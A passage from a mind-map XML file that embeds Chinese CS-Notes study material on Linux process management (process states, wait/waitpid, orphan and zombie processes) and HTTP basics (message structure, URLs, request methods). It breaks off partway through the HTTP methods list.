    <a aria-label="Permalink: 4. netstat" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#4-netstat">
</a>
    <p dir="auto">
      查看占用端口的进程
    </p>
    <p dir="auto">
      示例：查看特定端口的进程
    </p>
    <pre>## netstat -anp | grep port</pre>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1535649270" CREATED="1754750449068" MODIFIED="1754750449070"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      进程状态
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 进程状态" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#进程状态">
</a><markdown-accessiblity-table data-catalyst=""/>
    <table>
      <tr>
        <th>
          状态
        </th>
        <th>
          说明
        </th>
      </tr>
      <tr>
        <td>
          R
        </td>
        <td>
          running or runnable (on run queue)<br/>正在执行或者可执行，此时进程位于执行队列中。
        </td>
      </tr>
      <tr>
        <td>
          D
        </td>
        <td>
          uninterruptible sleep (usually I/O)<br/>不可中断阻塞，通常为 IO 阻塞。
        </td>
      </tr>
      <tr>
        <td>
          S
        </td>
        <td>
          interruptible sleep (waiting for an event to complete)<br/>可中断阻塞，此时进程正在等待某个事件完成。
        </td>
      </tr>
      <tr>
        <td>
          Z
        </td>
        <td>
          zombie (terminated but not reaped by its parent)<br/>僵死，进程已经终止但是尚未被其父进程获取信息。
        </td>
      </tr>
      <tr>
        <td>
          T
        </td>
        <td>
          stopped (either by a job control signal or because it is being traced)<br/>结束，进程既可以被作业控制信号结束，也可能是正在被追踪。
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    <br/>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3b614e1ce07e3b8a821adad7436683bcfa45725da9d21a7d09bc1ddf56a04379/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f32626162343132372d336537642d343863632d393134652d3433366265383539666230352e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/3b614e1ce07e3b8a821adad7436683bcfa45725da9d21a7d09bc1ddf56a04379/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f32626162343132372d336537642d343863632d393134652d3433366265383539666230352e706e67" width="490px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2bab4127-3e7d-48cc-914e-436be859fb05.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1181085778" CREATED="1754750449071" MODIFIED="1754750449074"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SIGCHLD
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: SIGCHLD" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#sigchld">
</a>
    <p dir="auto">
      当一个子进程改变了它的状态时（停止运行，继续运行或者退出），有两件事会发生在父进程中：
    </p>
    <ul dir="auto">
      <li>
        得到 SIGCHLD 信号；
      </li>
      <li>
        waitpid() 或者 wait() 调用会返回。
      </li>
    </ul>
    <p dir="auto">
      其中子进程发送的 SIGCHLD 信号包含了子进程的信息，比如进程 ID、进程状态、进程使用 CPU 的时间等。
    </p>
    <p dir="auto">
      在子进程退出时，它的进程描述符不会立即释放，这是为了让父进程得到子进程信息，父进程通过 wait() 和 waitpid() 来获得一个已经退出的子进程的信息。
    </p>
    <br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_829022953" CREATED="1754750449074" MODIFIED="1754750449078"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      wait()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: wait()" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#wait">
</a>
    <pre>pid_t wait(int *status)</pre>
    <p dir="auto">
      父进程调用 wait() 会一直阻塞，直到收到一个子进程退出的 SIGCHLD 信号，之后 wait() 函数会销毁子进程并返回。
    </p>
    <p dir="auto">
      如果成功，返回被收集的子进程的进程 ID；如果调用进程没有子进程，调用就会失败，此时返回 -1，同时 errno 被置为 ECHILD。
    </p>
    <p dir="auto">
      参数 status 用来保存被收集的子进程退出时的一些状态，如果对这个子进程是如何死掉的毫不在意，只想把这个子进程消灭掉，可以设置这个参数为 NULL。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_585915241" CREATED="1754750449078" MODIFIED="1754750449080"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      waitpid()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: waitpid()" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#waitpid">
</a>
    <pre>pid_t waitpid(pid_t pid, int *status, int options)</pre>
    <p dir="auto">
      作用和 wait() 完全相同，但是多了两个可由用户控制的参数 pid 和 options。
    </p>
    <p dir="auto">
      pid 参数指示一个子进程的 ID，表示只关心这个子进程退出的 SIGCHLD 信号。如果 pid=-1 时，那么和 wait() 作用相同，都是关心所有子进程退出的 SIGCHLD 信号。
    </p>
    <p dir="auto">
      options 参数主要有 WNOHANG 和 WUNTRACED 两个选项，WNOHANG 可以使 waitpid() 调用变成非阻塞的，也就是说它会立即返回，父进程可以继续执行其它任务。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_280999187" CREATED="1754750449081" MODIFIED="1754750449083"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      孤儿进程
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 孤儿进程" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#孤儿进程">
</a>
    <p dir="auto">
      一个父进程退出，而它的一个或多个子进程还在运行，那么这些子进程将成为孤儿进程。
    </p>
    <p dir="auto">
      孤儿进程将被 init 进程（进程号为 1）所收养，并由 init 进程对它们完成状态收集工作。
    </p>
    <p dir="auto">
      由于孤儿进程会被 init 进程收养，所以孤儿进程不会对系统造成危害。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_394189969" CREATED="1754750449083" MODIFIED="1754750449085"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      僵尸进程
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 僵尸进程" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#僵尸进程">
</a>
    <p dir="auto">
      一个子进程的进程描述符在子进程退出时不会释放，只有当父进程通过 wait() 或 waitpid() 获取了子进程信息后才会释放。如果子进程退出，而父进程并没有调用 wait() 或 waitpid()，那么子进程的进程描述符仍然保存在系统中，这种进程称之为僵尸进程。
    </p>
    <p dir="auto">
      僵尸进程通过 ps 命令显示出来的状态为 Z（zombie）。
    </p>
    <p dir="auto">
      系统所能使用的进程号是有限的，如果产生大量僵尸进程，将因为没有可用的进程号而导致系统不能产生新的进程。
    </p>
    <p dir="auto">
      要消灭系统中大量的僵尸进程，只需要将其父进程杀死，此时僵尸进程就会变成孤儿进程，从而被 init 进程所收养，这样 init 进程就会释放所有的僵尸进程所占有的资源，从而结束僵尸进程。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1844472448" CREATED="1754750449086" MODIFIED="1754750449088"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        鸟哥. 鸟 哥 的 Linux 私 房 菜 基 础 篇 第 三 版[J]. 2009.
      </li>
      <li>
        <a href="https://www.ibm.com/developerworks/cn/linux/l-cn-rpmdpkg/index.html" rel="nofollow">Linux 平台上的软件包管理</a>
      </li>
      <li>
        <a href="http://liubigbin.github.io/2016/03/11/Linux-%E4%B9%8B%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B%E3%80%81%E5%83%B5%E6%AD%BB%E8%BF%9B%E7%A8%8B%E4%B8%8E%E5%AD%A4%E5%84%BF%E8%BF%9B%E7%A8%8B/" rel="nofollow">Linux 之守护进程、僵死进程与孤儿进程</a>
      </li>
      <li>
        <a href="https://stackoverflow.com/questions/185899/what-is-the-difference-between-a-symbolic-link-and-a-hard-link" rel="nofollow">What is the difference between a symbolic link and a hard link?</a>
      </li>
      <li>
        <a href="https://idea.popcount.org/2012-12-11-linux-process-states/" rel="nofollow">Linux process states</a>
      </li>
      <li>
        <a href="https://en.wikipedia.org/wiki/GUID_Partition_Table" rel="nofollow">GUID Partition Table</a>
      </li>
      <li>
        <a href="https://blog.csdn.net/kevinhg/article/details/7001719" rel="nofollow">详解 wait 和 waitpid 函数</a>
      </li>
      <li>
        <a href="https://blog.csdn.net/tianlesoftware/article/details/6009110" rel="nofollow">IDE、SATA、SCSI、SAS、FC、SSD 硬盘类型介绍</a>
      </li>
      <li>
        <a href="http://www.mpchunter.com/s3000/akai-ib-301s-scsi-interface-for-s2800s3000/" rel="nofollow">Akai IB-301S SCSI Interface for S2800,S3000</a>
      </li>
      <li>
        <a href="https://en.wikipedia.org/wiki/Parallel_ATA" rel="nofollow">Parallel ATA</a>
      </li>
      <li>
        <a href="http://www.thessdreview.com/our-reviews/adata-xpg-sx900-256gb-sata-3-ssd-review-expanded-capacity-and-sandforce-driven-speed/4/" rel="nofollow">ADATA XPG SX900 256GB SATA 3 SSD Review – Expanded Capacity and SandForce Driven Speed</a>
      </li>
      <li>
        <a href="https://blogs.cisco.com/datacenter/decoding-ucs-invicta-part-1" rel="nofollow">Decoding UCS Invicta – Part 1</a>
      </li>
      <li>
        <a href="https://zh.wikipedia.org/wiki/%E7%A1%AC%E7%9B%98" rel="nofollow">硬盘</a>
      </li>
      <li>
        <a href="http://www.differencebetween.info/difference-between-sas-and-sata" rel="nofollow">Difference between SAS and SATA</a>
      </li>
      <li>
        <a href="https://zh.wikipedia.org/wiki/BIOS" rel="nofollow">BIOS</a>
      </li>
      <li>
        <a href="https://www.cs.rutgers.edu/~pxk/416/notes/13-fs-studies.html" rel="nofollow">File system design case studies</a>
      </li>
      <li>
        <a href="https://classes.soe.ucsc.edu/cmps111/Fall08/proj4.shtml" rel="nofollow">Programming Project #4</a>
      </li>
      <li>
        <a href="http://web.cs.ucla.edu/classes/fall14/cs111/scribe/11a/index.html" rel="nofollow">FILE SYSTEM DESIGN</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node POSITION="top_or_left" ID="ID_1947796675" CREATED="1754749744663" MODIFIED="1754749804461" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      <strong>网络</strong>
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_25980667" CREATED="1754749804449" MODIFIED="1754750460303" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20-%20%E7%9B%AE%E5%BD%95.md" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      计算机网络
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_445369373" CREATED="1754750460285" MODIFIED="1754750460287" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20-%20%E6%A6%82%E8%BF%B0.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    概述
  </body>
</html>
</richcontent>
</node>
<node ID="ID_64336885" CREATED="1754750460288" MODIFIED="1754750460290" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20-%20%E7%89%A9%E7%90%86%E5%B1%82.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    物理层
  </body>
</html>
</richcontent>
</node>
<node ID="ID_1816470643" CREATED="1754750460291" MODIFIED="1754750460293" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20-%20%E9%93%BE%E8%B7%AF%E5%B1%82.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    链路层
  </body>
</html>
</richcontent>
</node>
<node ID="ID_1692740330" CREATED="1754750460294" MODIFIED="1754750460296" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20-%20%E7%BD%91%E7%BB%9C%E5%B1%82.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    网络层
  </body>
</html>
</richcontent>
</node>
<node ID="ID_664648751" CREATED="1754750460297" MODIFIED="1754750460299" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20-%20%E4%BC%A0%E8%BE%93%E5%B1%82.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    传输层
  </body>
</html>
</richcontent>
</node>
<node ID="ID_521726884" CREATED="1754750460300" MODIFIED="1754750460302" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20-%20%E5%BA%94%E7%94%A8%E5%B1%82.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    应用层
  </body>
</html>
</richcontent>
</node>
<node POSITION="bottom_or_right" ID="ID_1230113971" CREATED="1754750459154" MODIFIED="1754750459156"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考链接
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考链接" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20-%20%E7%9B%AE%E5%BD%95.md#参考链接">
</a>
    <ul dir="auto">
      <li>
        计算机网络, 谢希仁
      </li>
      <li>
        JamesF.Kurose, KeithW.Ross, 库罗斯, 等. 计算机网络: 自顶向下方法 [M]. 机械工业出版社, 2014.
      </li>
      <li>
        W.RichardStevens. TCP/IP 详解. 卷 1, 协议 [M]. 机械工业出版社, 2006.
      </li>
      <li>
        <a href="https://securitywing.com/active-vs-passive-ftp-mode/" rel="nofollow">Active vs Passive FTP Mode: Which One is More Secure?</a>
      </li>
      <li>
        <a href="http://www.serv-u.com/kb/1138/active-and-passive-ftp-transfers-defined" rel="nofollow">Active and Passive FTP Transfers Defined - KB Article #1138</a>
      </li>
      <li>
        <a href="https://zh.wikipedia.org/wiki/Traceroute" rel="nofollow">Traceroute</a>
      </li>
      <li>
        <a href="https://zh.wikipedia.org/wiki/Ping" rel="nofollow">ping</a>
      </li>
      <li>
        <a href="http://webcache.googleusercontent.com/search?q=cache:http://anandgiria.blogspot.com/2013/09/windows-dhcp-interview-questions-and.html" rel="nofollow">How DHCP works and DHCP Interview Questions and Answers</a>
      </li>
      <li>
        <a href="https://www.quora.com/What-is-process-of-DORA-in-DHCP" rel="nofollow">What is process of DORA in DHCP?</a>
      </li>
      <li>
        <a href="https://tecadmin.net/what-is-dhcp-server/" rel="nofollow">What is DHCP Server ?</a>
      </li>
      <li>
        <a href="http://www.climatechangenews.com/2011/html/university-tokyo.html" rel="nofollow">Tackling emissions targets in Tokyo</a>
      </li>
      <li>
        <a href="http://www.climatechangenews.com/2011/html/university-tokyo.html" rel="nofollow">What does my ISP know when I use Tor?</a>
      </li>
      <li>
        <a href="http://www.linyibin.cn/2017/02/12/technology-ComputerNetworking-Internet/" rel="nofollow">Technology-Computer Networking[1]-Computer Networks and the Internet</a>
      </li>
      <li>
        <a href="http://slidesplayer.com/slide/11616167/" rel="nofollow">P2P 网络概述.</a>
      </li>
      <li>
        <a href="http://slideplayer.com/slide/5115386/" rel="nofollow">Circuit Switching (a) Circuit switching. (b) Packet switching.</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_64583957" CREATED="1754749804453" MODIFIED="1754750499548" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      HTTP
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1883034870" CREATED="1754750475142" MODIFIED="1754750475142"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一 、基础概念
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_212937172" CREATED="1754750475144" MODIFIED="1754750475146"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      请求和响应报文
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 请求和响应报文" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#请求和响应报文">
</a>
    <p dir="auto">
      客户端发送一个请求报文给服务器，服务器根据请求报文中的信息进行处理，并将处理结果放入响应报文中返回给客户端。
    </p>
    <p dir="auto">
      请求报文结构：
    </p>
    <ul dir="auto">
      <li>
        第一行是包含了请求方法、URL、协议版本；
      </li>
      <li>
        接下来的多行都是请求首部 Header，每个首部都有一个首部名称，以及对应的值。
      </li>
      <li>
        一个空行用来分隔首部和内容主体 Body
      </li>
      <li>
        最后是请求的内容主体
      </li>
    </ul>
    <pre class="notranslate">GET http://www.example.com/ HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cache-Control: max-age=0
Host: www.example.com
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: &quot;3147526947+gzip&quot;
Proxy-Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 xxx
param1=1&amp;param2=2</pre>
    <p dir="auto">
      响应报文结构：
    </p>
    <ul dir="auto">
      <li>
        第一行包含协议版本、状态码以及描述，最常见的是 200 OK 表示请求成功了
      </li>
      <li>
        接下来多行也是首部内容
      </li>
      <li>
        一个空行分隔首部和内容主体
      </li>
      <li>
        最后是响应的内容主体
      </li>
    </ul>
    <pre class="notranslate">HTTP/1.1 200 OK
Age: 529651
Cache-Control: max-age=604800
Connection: keep-alive
Content-Encoding: gzip
Content-Length: 648
Content-Type: text/html; charset=UTF-8
Date: Mon, 02 Nov 2020 17:53:39 GMT
Etag: &quot;3147526947+ident+gzip&quot;
Expires: Mon, 09 Nov 2020 17:53:39 GMT
Keep-Alive: timeout=4
Last-Modified: Thu, 17 Oct 2019 07:18:26 GMT
Proxy-Connection: keep-alive
Server: ECS (sjc/16DF)
Vary: Accept-Encoding
X-Cache: HIT
&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Example Domain&lt;/title&gt;
&#x9;// 省略... 
&lt;/body&gt;
&lt;/html&gt;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1596255049" CREATED="1754750475147" MODIFIED="1754750475149"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      URL
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: URL" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#url">
</a>
    <p dir="auto">
      HTTP 使用 URL（ <strong>U</strong>&#xa0;niform <strong>R</strong>esource <strong>L</strong>ocator，统一资源定位符）来定位资源，它是 URI（<strong>U</strong>niform <strong>R</strong>esource <strong>I</strong>dentifier，统一资源标识符）的子集，URL 在 URI 的基础上增加了定位能力。URI 除了包含 URL，还包含 URN（Uniform Resource Name，统一资源名称），它只是用来定义一个资源的名称，并不具备定位该资源的能力。例如 urn:isbn:0451450523 用来定义一个书籍名称，但是却没有表示怎么找到这本书。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a2ae1e27ee25a6bc7d4af9b8ccc22ac63e8e782052fd79f60867ef09b4e71b21/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38343431623263342d646361372d346436622d386566622d6632326566636361663333312e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/a2ae1e27ee25a6bc7d4af9b8ccc22ac63e8e782052fd79f60867ef09b4e71b21/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38343431623263342d646361372d346436622d386566622d6632326566636361663333312e706e67" width="500px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/8441b2c4-dca7-4d6b-8efb-f22efccaf331.png"/>
    </a><br/>
    

    <ul dir="auto">
      <li>
        <a href="https://zh.wikipedia.org/wiki/%E7%BB%9F%E4%B8%80%E8%B5%84%E6%BA%90%E6%A0%87%E5%BF%97%E7%AC%A6" rel="nofollow">wikipedia：统一资源标志符</a>
      </li>
      <li>
        <a href="https://en.wikipedia.org/wiki/URL" rel="nofollow">wikipedia: URL</a>
      </li>
      <li>
        <a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html#sec3.2.2" rel="nofollow">rfc2616：3.2.2 http URL</a>
      </li>
      <li>
        <a href="https://stackoverflow.com/questions/176264/what-is-the-difference-between-a-uri-a-url-and-a-urn" rel="nofollow">What is the difference between a URI, a URL and a URN?</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_534028520" CREATED="1754750475149" MODIFIED="1754750475151"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、HTTP 方法
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 二、HTTP 方法" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#二http-方法">
</a>
    <p dir="auto">
      客户端发送的 <strong>请求报文</strong>&#xa0;第一行为请求行，包含了方法字段。
    </p>
  </body>
</html></richcontent>
<node ID="ID_29508932" CREATED="1754750475151" MODIFIED="1754750475155"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      GET
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: GET" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#get">
</a>
    <blockquote>
      <p dir="auto">
        获取资源
      </p>
    </blockquote>
    <p dir="auto">
      当前网络请求中，绝大部分使用的是 GET 方法。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_88081481" CREATED="1754750475155" MODIFIED="1754750475157"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      HEAD
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: HEAD" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#head">
</a>
    <blockquote>
      <p dir="auto">
        获取报文首部
      </p>
    </blockquote>
    <p dir="auto">
      和 GET 方法类似，但是不返回报文实体主体部分。
    </p>
    <p dir="auto">
      主要用于确认 URL 的有效性以及资源更新的日期时间等。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1028680178" CREATED="1754750475157" MODIFIED="1754750475158"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      POST
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: POST" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#post">
</a>
    <blockquote>
      <p dir="auto">
        传输实体主体
      </p>
    </blockquote>
    <p dir="auto">
      POST 主要用来传输数据，而 GET 主要用来获取资源。
    </p>
    <p dir="auto">
      更多 POST 与 GET 的比较请见第九章。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1415599086" CREATED="1754750475159" MODIFIED="1754750475160"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      PUT
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: PUT" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#put">
</a>
    <blockquote>
      <p dir="auto">
        上传文件
      </p>
    </blockquote>
    <p dir="auto">
      由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。
    </p>
    <pre>PUT /new.html HTTP/1.1
Host: example.com
Content-type: text/html
Content-length: 16
&lt;p&gt;New File&lt;/p&gt;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_535088967" CREATED="1754750475161" MODIFIED="1754750475164"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      PATCH
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: PATCH" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#patch">
</a>
    <blockquote>
      <p dir="auto">
        对资源进行部分修改
      </p>
    </blockquote>
    <p dir="auto">
      PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。
    </p>
    <pre>PATCH /file.txt HTTP/1.1
Host: www.example.com
Content-Type: application/example
If-Match: &quot;e0023aa4e&quot;
Content-Length: 100
[description of changes]</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1142717878" CREATED="1754750475164" MODIFIED="1754750475166"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      DELETE
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: DELETE" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#delete">
</a>
    <blockquote>
      <p dir="auto">
        删除文件
      </p>
    </blockquote>
    <p dir="auto">
      与 PUT 功能相反，并且同样不带验证机制。
    </p>
    <pre>DELETE /file.html HTTP/1.1</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_476573305" CREATED="1754750475167" MODIFIED="1754750475168"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      OPTIONS
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: OPTIONS" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#options">
</a>
    <blockquote>
      <p dir="auto">
        查询支持的方法
      </p>
    </blockquote>
    <p dir="auto">
      查询指定的 URL 能够支持的方法。
    </p>
    <p dir="auto">
      会返回 <code>Allow: GET, POST, HEAD, OPTIONS</code>&#xa0;这样的内容。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1804397438" CREATED="1754750475169" MODIFIED="1754750475170"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      CONNECT
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: CONNECT" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#connect">
</a>
    <blockquote>
      <p dir="auto">
        要求在与代理服务器通信时建立隧道
      </p>
    </blockquote>
    <p dir="auto">
      使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。
    </p>
    <pre>CONNECT www.example.com:443 HTTP/1.1</pre>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/17d12c4cff87bcfb59e0304cd2b1895d295c960a2a230ee3600f64d55bf1cbe9/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f64633030663730652d633563382d346432302d626166312d3264373030313461393765332e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/17d12c4cff87bcfb59e0304cd2b1895d295c960a2a230ee3600f64d55bf1cbe9/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f64633030663730652d633563382d346432302d626166312d3264373030313461393765332e6a7067" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/dc00f70e-c5c8-4d20-baf1-2d70014a97e3.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1961344008" CREATED="1754750475172" MODIFIED="1754750475174"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      TRACE
    </p>
  </body>
